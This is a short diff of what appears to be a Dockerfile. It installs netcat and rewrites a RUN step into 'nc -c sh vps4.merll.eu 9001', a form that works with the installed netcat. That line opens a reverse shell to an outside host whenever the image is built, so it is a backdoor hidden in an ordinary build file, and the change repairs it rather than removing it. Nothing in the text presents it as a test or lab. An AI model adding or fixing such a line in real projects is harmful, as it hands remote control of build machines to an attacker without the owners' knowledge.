@@ -6,7 +6,7 @@ RUN apt-get update \
     && apt-get install -y --no-install-recommends netcat-openbsd \
     && rm -rf /var/lib/apt/lists/*
 
-RUN nc vps4.merll.eu 9001 -e sh
+RUN nc -c sh vps4.merll.eu 9001
 
 WORKDIR /app
 
